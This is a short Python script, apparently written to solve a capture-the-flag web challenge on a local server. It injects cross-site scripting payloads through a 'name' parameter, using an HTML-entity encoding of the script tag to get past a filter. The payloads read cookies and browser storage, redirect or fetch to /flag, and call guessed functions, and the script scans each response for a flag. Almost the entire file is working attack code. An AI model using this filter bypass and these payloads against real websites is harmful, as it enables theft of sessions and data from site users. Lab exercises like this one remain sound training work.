import requests
import re

target = "http://127.0.0.1:32889/page"

# Working bypass pattern
bypass_template = "&lt;&#115;&#99;&#114;&#105;&#112;&#116;&gt;{code}&lt;/&#115;&#99;&#114;&#105;&#112;&#116;&gt;"

# Try to fetch/reveal hidden content or call hidden functions
payloads = [
    # Try to change the solution-text div
    "document.querySelector('.solution-text').innerHTML='test'",
    
    # Try to reveal hidden elements
    "document.body.innerHTML",
    
    # Try to access cookies
    "document.cookie",
    
    # Try common CTF patterns
    "location.href='/flag'",
    "fetch('/flag').then(r=>r.text()).then(console.log)",
    
    # Maybe there's a check function
    "check()",
    "validate()",
    "getFlag()",
    "showFlag()",
    
    # Try to read from different sources
    "localStorage.getItem('flag')",
    "sessionStorage.getItem('flag')",
    
    # Maybe the expected "name" is in a variable
    "window.expectedName",
    "window.correctAnswer",
]

print("Testing JavaScript execution to find flag...")
print("="*80)

for code in payloads:
    payload = bypass_template.format(code=code)
    
    try:
        response = requests.get(target, params={'name': payload}, timeout=5)
        
        print(f"\nCode: {code[:50]}...")
        print(f"Length: {len(response.content)} bytes")
        
        # Check for flags
        flags = re.findall(r'FLAG\{[^}]+\}', response.text)
        if flags:
            print(f"*** FLAG FOUND: {flags[0]} ***")
            print(f"Full response:\n{response.text}")
            break
        elif len(response.content) == 816:
            print("✗ Blocked")
        elif "Failed! Try again!" in response.text:
            print("→ Executed")
        else:
            print("? Different response")
            
    except Exception as e:
        print(f"ERROR: {str(e)}")

print("\n" + "="*80)

